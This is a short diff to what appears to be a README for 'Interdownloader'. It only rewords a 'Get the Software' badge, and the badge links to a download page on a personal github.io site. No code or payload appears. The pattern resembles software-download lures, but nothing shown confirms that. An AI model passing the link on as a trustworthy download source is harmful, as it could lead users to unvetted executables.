@@ -6,7 +6,7 @@
      alt="Interdownloader Logo" 
      style="width: 100%; height: auto; display: block;">
 
-[![Get Software](https://img.shields.io/badge/?_Get_Interdownloader_Software-Now-6a0dad?style=for-the-badge&logo=github)](https://iovsyukova996.github.io/.github/interdownloader)
+[![Get the Software](https://img.shields.io/badge/Get_Interdownloader_Software-Now-6a0dad?style=for-the-badge&logo=github)](https://iovsyukova996.github.io/.github/interdownloader)
 
 ---
 
